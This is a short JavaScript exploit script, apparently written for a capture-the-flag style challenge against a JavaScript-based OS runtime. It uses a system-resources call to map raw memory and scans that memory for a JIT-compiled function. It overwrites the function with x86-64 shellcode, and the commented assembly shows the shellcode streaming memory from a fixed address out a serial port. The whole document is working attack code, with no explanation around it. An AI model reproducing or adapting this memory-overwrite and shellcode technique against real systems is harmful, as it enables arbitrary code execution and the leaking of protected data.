/*
mov rax, 0xdeada0008b
mov [0x1a01c00], rax

xor rcx, rcx
mov ecx, 0x301eeeef
xor rdx, rdx
mov edx, 0x3f8

loop:
mov rax, [rcx]
out dx, al
inc rcx

jmp loop
*/
var shellcode = [0x008bb848,0x00deada0,0x89480000,0x1c002504,0x314801a0,0xeeefb9c9,0x3148301e,0x03f8bad2,0x8b480000,0xff48ee01,0xf7ebc1];

var jit = new Function(['a'], 'return 0x1234;');
jit();

var mem = new Uint32Array(__SYSCALL.getSystemResources().memoryRange.block(0x1000, 0x40000000-0x1000).buffer());

function mem2idx(addr) {
    return ((addr-0x1000)/4);
}

for (addr = 0x10000000; addr < 0x20000000; addr+=4) {
    if (mem[mem2idx(addr)] == 3850979413 && // push   %rbp; mov    %rsp,%rbp
        mem[mem2idx(addr+0x14)] == 47176 &&
        mem[mem2idx(addr+0x18)] == 305397760) { // mov    $0x123400000000,%rax
        console.log("Function at "+addr);
        for (i = 0; i < shellcode.length; i++) {
            mem[mem2idx(addr + (i*4))] = shellcode[i];
        }
    }
}

console.log("Onwards to shellcode!");
jit();
